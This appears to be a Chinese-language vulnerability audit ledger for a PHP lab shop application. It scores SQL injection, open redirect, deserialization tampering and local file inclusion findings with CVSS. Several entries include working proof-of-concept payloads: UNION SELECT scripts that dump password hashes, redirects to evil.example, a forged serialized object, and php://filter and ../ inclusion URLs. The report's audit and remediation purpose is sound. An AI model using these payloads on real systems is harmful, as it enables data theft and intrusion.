- 评分时间：2026-10-27T17:22:12.964841+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Web GET 入口 /ops/members.php | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接拼接，无需特殊条件 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | H | require_user(['operator','admin']) 权限门 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人交互 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一数据库会话内读取 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可 UNION 读取 users 表含密码哈希 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | SELECT 语句，无写入证据 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏证据 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_member_lookup.py', 'language': 'python', 'script': 'import requests, sys\nbase = sys.argv[1].rstrip(\'/\')\ns = requests.Session()\ns.post(base + \'/auth/login.php\', data={\'username\': \'operator\', \'password\': \'PASSWORD\'})\nr = s.get(base + \'/ops/members.php\', params={\'q\': "\' UNION SELECT id,username,password_md5,role FROM users-- -"}, headers={\'Accept\': \'application/json\'})\nprint(r.text)\n', 'instructions': '替换 base URL 与 operator 账号口令后运行，携带 Accept: application/json 便于观察返回；目标入口 /ops/members.php?q=', 'normal_input': 'q=alice', 'attack_input': "q=' UNION SELECT id,username,password_md5,role FROM users-- -", 'expected_result': '正常输入仅返回 alice；注入输入返回 users 表任意列数据'}
````


### 台账 `5c3db49dc8ce4eeab05208bd9757d432`

- auth/continue.php 未校验 next 参数导致开放重定向（CVSS 3.1 Base 0.0 (none) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:N，验证：inconclusive）
  来源 `d78a06da98e94a9c81744a2d06a616ff` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/auth/continue.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：第3行将 $_GET['next'] 原样拼接到 Location 头，无主机/协议白名单，攻击者可诱导已登录用户跳转到外部站点。
  输入：$_GET['next']
  传播：$_GET['next'] -> header('Location: '.$next)
  危险操作：HTTP 302 Location 头注入外部 URL
  保护：无白名单或前缀校验；仅 require_user 限制登录
  前提：['攻击者已登录或受害者已登录后点击构造链接']
  修复建议：对 next 做站内相对路径白名单校验（如 parse_url 后要求 host 为空且以 / 开头），或用固定映射表。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:25:22.073683+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP GET 访问 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接拼接参数即可 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录（require_user） | lab30-shop/app/src/bootstrap.php:33-37 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者点击构造链接 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仅跳转，不改变授权边界 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 无数据泄露 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 无完整性影响 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'open_redirect_poc.txt', 'language': 'http', 'script': 'GET /auth/continue.php?next=https://evil.example/ HTTP/1.1\nHost: target\nCookie: SHOPSESSID=<valid>', 'instructions': '以已登录会话请求该 URL，观察响应 Location 头指向 evil.example', 'normal_input': 'next=/orders/index.php', 'attack_input': 'next=https://evil.example/', 'expected_result': '正常情况跳转站内路径；攻击情况 Location 指向外部域'}
````

- auth/continue.php 的 next 参数未经校验直接用于 Location 跳转导致开放重定向（CVSS 3.1 Base 3.5 (low) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N，验证：verified）
  来源 `f858c55102d348e1bc9730b3f483377b` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/auth/continue.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 34}]
  结论：continue.php 第3行检测到 next 参数后直接 header('Location: '.(string)$_GET['next'])，未做同源域名或白名单校验，攻击者可构造 next=https://evil.example 让已登录用户被跳转至外部站点。
  输入：GET 参数 next
  传播：$_GET['next'] -> (string) 拼接 -> header('Location: ...')
  危险操作：向客户端发送任意目标 Location 头
  保护：无同源/白名单/协议校验；bootstrap 中未定义 URL 校验函数；require_user 只要求登录
  前提：['攻击者需构造带 next 参数的链接让目标用户点击']
  修复建议：仅允许站内相对路径：拒绝包含 scheme/host 的 next，或以允许的路径白名单校验后再跳转。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:55:40.917069+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口可远程访问 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需构造 next 参数即可触发 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 第2行 require_user() 要求登录用户 | lab30-shop/app/public/auth/continue.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 受害者需点击链接或访问构造 URL 才会跳转 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 重定向目标改变但不改变授权边界 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 不直接泄露数据 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可将用户导向攻击者站点用于钓鱼 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 不破坏可用性 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'open_redirect.sh', 'language': 'bash', 'script': "curl -s -i -b 'SHOPSESSID=<valid_session>' 'http://target/auth/continue.php?next=https://evil.example/phish' | grep -i '^Location:'", 'instructions': '登录后携带会话访问该 URL，观察响应 Location 头是否为外部域名。', 'normal_input': '?next=/orders/index.php', 'attack_input': '?next=https://evil.example/phish', 'expected_result': '正常输入 Location 指向站内相对路径；攻击输入 Location 为 https://evil.example/phish，证明可重定向到任意外部站点。'}
````


### 台账 `f75167dc8d144d2582f1581c4e394270`

- account/backup.php 反序列化用户输入并据其属性更新用户 tier/display_name（CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N，验证：verified）
  来源 `224f9d318c2344dbaa8a909b47430de7` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/backup.php', 'start_line': 1, 'end_line': 8}, {'path': 'lab30-shop/app/src/backup.php', 'start_line': 1, 'end_line': 5}]
  结论：第4-5行对 POST base64 内容 unserialize 并就其属性构造 UPDATE，用户可提交伪造 MemberBackup 序列化对象将自身 tier 改为高等级。MemberBackup 无魔术方法，故无对象注入代码执行，但属性篡改权益成立。
  输入：$_POST['backup']（base64 编码的户控序列化串）
  传播：base64_decode -> unserialize -> $restored->tier/displayName -> UPDATE users
  危险操作：unserialize 不可信数据并据反序列化属性更新会员权益
  保护：csrf 校验与 instanceof 检查存在，但 instanceof 不阻止属性篡改
  前提：['攻击者需已登录账号']
  修复建议：不要 unserialize 用户输入；改用 JSON 并仅接受白名单 tier 枚举，或让服务端仅允许恢复 display_name 等无害字段。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:25:22.074756+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP POST | lab30-shop/app/public/account/backup.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 base64 序列化串即可 | lab30-shop/app/public/account/backup.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录普通用户 | lab30-shop/app/src/bootstrap.php:33-37 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行提交 | lab30-shop/app/public/account/backup.php:3-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响自身账户记录，不跨越授权边界 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 无读取 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可篡改自身 tier/display_name | lab30-shop/app/public/account/backup.php:5-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'backup_deser_poc.php', 'language': 'php', 'script': "<?php\nclass MemberBackup{public $tier='vip';public $displayName='hacked';}\necho base64_encode(serialize(new MemberBackup));\n", 'instructions': '运行生成 base64，作为 backup 字段 POST 至 /account/backup.php（带有效 csrf）', 'normal_input': '使用站点导出的当前备份 base64', 'attack_input': '伪造 tier=vip 的序列化串 base64', 'expected_result': '正常恢复原值；攻击后数据库 tier 被改为 vip'}
````


### 台账 `a4a6743f9b5649b4a1ef38011e51f504`

- 会员查询 GET q 拼接进 LIKE 导致 SQL 注入（operator/admin 可达）（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：verified）
  来源 `f8004459e9c24a3c9106454845fbff73` / 修订 1
  证据：[{'path': 'lab30-shop/app/src/member_lookup.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/public/ops/members.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 4, 'end_line': 8}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：member_lookup() 把字符串参数直接拼入 SELECT ... WHERE username LIKE '%term%' 并无参数化或过滤，随后 db()->query 执行。唯一上游调用位于 ops/members.php:2：$term=(string)($_GET['q']??'alice') 后直接 member_lookup($term)。该页仅 require_user(['operator','admin']) 做角色校验，任意运营账号可闭合引号注入，JSON 响应回显查询结果。
  输入：HTTP GET 参数 q（ops/members.php:2）
  传播：$_GET['q'] -> $term -> member_lookup($term) -> db()->query(... . $term . ...)
  危险操作：db()->query 执行拼接后的 SQL 字符串（member_lookup.php:3）
  保护：仅 require_user 角色校验；无参数化、无转义、无白名单，PDO prepare 未用于此查询
  前提：['持有 operator 或 admin 会话并访问 /ops/members.php?q=，Accept: application/json 可直接获得结构化结果']
  修复建议：改为 PDO 预处理，LIKE 模式作为绑定参数（WHERE username LIKE ?，参数 '%'.$term.'%'），并转义 %/_，对 q 限长限字符。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:26:00.202862+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 远程 GET 请求可达 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 闭合引号即可注入 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 账号 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人交互 | lab30-shop/app/public/ops/members.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一数据库连接内读取 | lab30-shop/app/src/bootstrap.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | UNION 可读取 users 等表全部字段含口令哈希 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 该路径仅 SELECT | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏性操作证据 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_member_lookup.py', 'language': 'python', 'script': 'import urllib.request, urllib.parse\nbase=\'http://TARGET\'\nsid=\'<SESSION_ID>\'\npayload="x%\' UNION SELECT id,username,password_md5,role FROM users-- -"\nreq=urllib.request.Request(base+\'/ops/members.php?q=\'+urllib.parse.quote(payload))\nreq.add_header(\'Cookie\',\'SHOPSESSID=\'+sid)\nreq.add_header(\'Accept\',\'application/json\')\nprint(urllib.request.urlopen(req).read().decode())', 'instructions': '以 operator/admin 登录取得 SHOPSESSID，替换 TARGET 与 sid 后运行；对照请求使用 q=alice。', 'normal_input': 'q=alice', 'attack_input': "q=x%' UNION SELECT id,username,password_md5,role FROM users-- -", 'expected_result': '正常请求只返回 username 含 alice 的行；攻击请求返回其它（全部）用户的 username 与 password_md5 哈希。'}
````


### 台账 `5f8a819f26e14990a4204f0220c29672`

- content/page.php 未过滤 page 参数导致本地文件包含/路径遍历（CVSS 3.1 Base 9.4 (critical) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L，验证：inconclusive）
  来源 `be8bc17e9a3b4a5ea033a3f62571563b` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/content/page.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 47, 'end_line': 61}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 30, 'end_line': 36}]
  结论：content/page.php 第2行把 $_GET['page'] 强制转字符串后原样使用，第3行将其拼成 APP_ROOT.'/resources/views/'.$name.'.php' 并 include，未做白名单、basename 或 realpath 校验。匿名用户可传 page=../../../../var/lib/shop/vault/account（实际路径需尝试 ../ 数量）或 page=php://filter/convert.base64-encode/resource=... 实现本地文件包含与源码读取；setup.php:34-36 明确在 data_dir 生成 vault/internal.txt 与可执行 PHP 文件 vault/account.php，说明穿越目标确实存在。
  输入：$_GET['page']
  传播：page.php:2 读取参数 -> page.php:3 拼入 include 路径
  危险操作：include APP_ROOT.'/resources/views/'.$name.'.php'
  保护：无白名单、无 basename、无 realpath 前缀校验；h() 只用于 title 输出，不影响 include
  前提：['APP_ROOT/resources/views 目录可被相对路径逃逸；data_dir 默认 /var/lib/shop，含 vault/account.php 与 internal.txt']
  修复建议：使用固定白名单映射（如 home/shipping），或对 $name 做 basename 并验证 realpath 位于 views 目录内；禁用 php:// 包装器（allow_url_include=0）。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:26:34.241327+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 可通过 HTTP 访问公开页面触发 | lab30-shop/app/public/content/page.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接构造 page 参数即可 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 页面无需 require_user，匿名可访问 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户交互 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 作用限于本应用进程内的文件包含 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可包含 php://filter 或 data_dir 下 PHP 文件读取敏感内容 | lab30-shop/app/src/setup.php:34-35 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 被包含的 PHP 文件（如 vault/account.php）会被执行或可在含系统命令时影响完整性 | lab30-shop/app/src/setup.php:35-35 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | L | 包含响应可能异常但无直接破坏证据 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。

- content/page.php 未过滤 page 参数导致本地文件包含/路径遍历（CVSS 3.1 Base 8.2 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N，验证：inconclusive）
  来源 `154489f2096046918c71ea6db2114be0` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/content/page.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 3, 'end_line': 3}]
  结论：page.php 第2行将 $_GET['page'] 转成字符串后未做白名单或 basename 处理，第3行直接 include APP_ROOT.'/resources/views/'.$name.'.php'。APP_ROOT 在 bootstrap.php:3 为 src 上级目录，views 目录只有 home.php 与 shipping.php，攻击者可用 ../ 逃逸到 app/src 与 app/public 下既有 PHP 文件（如 page=../../src/setup），或用 php://filter 读取任意源码。
  输入：HTTP GET 参数 page
  传播：$_GET['page'] -> $name -> include APP_ROOT.'/resources/views/{$name}.php'
  危险操作：include 动态文件路径
  保护：无白名单、无 basename、无 realpath 前缀校验、无 open_basedir 证据
  前提：['page() 内部调用 db()，需数据库可用导致页面可正常渲染']
  修复建议：改用白名单映射（home/shipping），或 basename 后强制限定 views 目录并禁用 php:// 等包装器。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:27:27.414984+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP GET 远程触发 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 一个相对路径即可命中已存在文件 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 页面未调用 require_user | lab30-shop/app/public/content/page.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人交互 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一 PHP 应用上下文 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可包含执行 src 下任意 php，或经 php://filter 读取任意源码 | lab30-shop/app/src/bootstrap.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 被包含文件在请求进程内执行可能产生副作用 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接拒绝服务证据 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'lfi_page.php', 'language': 'php', 'script': '$u = \'http://TARGET/content/page.php\';\necho $u . \'?page=shipping\', "\\n";\necho $u . \'?page=../../src/setup\', "\\n";\necho $u . \'?page=php://filter/convert.base64-encode/resource=../../src/bootstrap\', "\\n";', 'instructions': '把 TARGET 换成靶场基址，依次访问三个 URL：对照、逃逸包含、php://filter 读取源码。', 'normal_input': '?page=shipping', 'attack_input': '?page=php://filter/convert.base64-encode/resource=../../src/bootstrap', 'expected_result': '对照返回配送视图；攻击请求返回 base64 编码的 bootstrap.php 源码，证明可任意读取/包含文件。'}
````

- content/page.php page 参数未过滤导致本地文件包含/路径遍历（CVSS 3.1 Base 9.8 (critical) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H，验证：inconclusive）
  来源 `5a81d3f2cdea4e31b598642ced45e906` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/content/page.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 3, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 47, 'end_line': 59}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 4, 'end_line': 4}, {'path': 'lab30-shop/app/resources/views/home.php', 'start_line': 1, 'end_line': 1}]
  结论：content/page.php 第2行把 $_GET['page'] 强转为字符串后直接交给闭包，第3行以 APP_ROOT.'/resources/views/'.$name.'.php' 做 include。前缀/后缀均可被 ../ 穿越，攻击者可包含服务器上任意 .php 文件（含 src/setup.php、src/bootstrap.php 等）并在包含时执行其中 PHP 代码，或通过穿越读取/执行快照外文件。无任何白名单、basename 或 realpath 校验。
  输入：GET 参数 page
  传播：page.php:2 $_GET['page'] -> $name -> 闭包 use($name) -> page.php:3 include 拼接路径
  危险操作：include 动态路径
  保护：bootstrap.php 的 h() 仅用于输出转义，不校验 $name；include 无白名单/basename/realpath 约束
  前提：['无需登录即可访问 /content/page.php（page() 内 user() 允许未登录渲染）']
  修复建议：使用白名单映射页面名到固定文件名，或对 $name 做 basename 并校验 realpath 位于 resources/views 目录内。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:27:57.157914+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP GET 入口，公网可直接访问 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需构造 page=../ 路径，无需复杂条件 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | page.php 未调用 require_user | lab30-shop/app/public/content/page.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者单方触发 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一 PHP 进程内文件包含，未改变授权边界 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可包含任意服务器 .php 文件，源码/内部 marker 可被回显 | lab30-shop/app/src/setup.php:34-35 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 包含 src/setup.php 后可直接调用 reset_shop 等破坏性函数 | lab30-shop/app/src/setup.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | reset_shop() 删除全表数据并删文件，包含即破坏可用性 | lab30-shop/app/src/setup.php:15-33 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'lfi_page_poc.sh', 'language': 'bash', 'script': "curl -sG 'http://TARGET/content/page.php' --data-urlencode 'page=../src/setup'", 'instructions': '访问目标站点 /content/page.php，将 page 设为 ../src/setup，观察响应是否包含被包含文件的执行结果（示例会触发 reset_shop 定义但不会自动调用，若改为 ../../../../var/lib/shop/vault/account 会回显 internal marker）。', 'normal_input': 'page=home', 'attack_input': 'page=../src/setup', 'expected_result': '正常请求渲染商城介绍页面；攻击请求包含 views 目录外的 PHP 文件，响应中输出该文件执行/回显内容或路径穿越成功。'}
````

- content/page.php page 参数未过滤直接进入 include（LFI/路径遍历）（CVSS 3.1 Base 8.2 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N，验证：inconclusive）
  来源 `52be9badb9f14065ac578909ebb8a42a` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/content/page.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 47, 'end_line': 59}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 9, 'end_line': 10}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 30, 'end_line': 38}]
  结论：content/page.php 第2行把 $_GET['page'] 转为字符串赋给 $name，第3行在闭包内直接拼入 include APP_ROOT.'/resources/views/'.$name.'.php'，未做 basename、白名单或 realpath 前缀校验。bootstrap.php 的 page() 不调用 require_user，匿名请求即可触发；setup.php 会在 data_dir 下写入含 PHP 代码的 vault/account.php，包含该文件即可执行其中的 PHP。
  输入：$_GET['page']（content/page.php:2）
  传播：page.php:2 读 GET page → 闭包 use($name) → page.php:3 include 拼接路径
  危险操作：include 由攻击者控制的路径，可跨越 resources/views 目录
  保护：无：未使用 basename、白名单、realpath 校验；bootstrap.php:10 的 h() 只做输出转义，对 include 无效
  前提：['目标路径存在对应 .php 文件；setup.php 生成的 vault/account.php 为现成载体']
  修复建议：将 page 参数映射为固定白名单，或使用 basename 并校验 realpath 位于 resources/views 内。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:28:57.272584+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP GET 参数经网络可达 | lab30-shop/app/public/content/page.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需构造相对路径，无额外条件 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | page() 无需登录 | lab30-shop/app/src/bootstrap.php:47-59 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人交互 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响限于应用进程自身权限 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可包含任意可读 PHP 文件并回显内容 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 包含 data_dir 下 PHP 文件时执行其中语句影响输出 | lab30-shop/app/src/setup.php:34-35 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
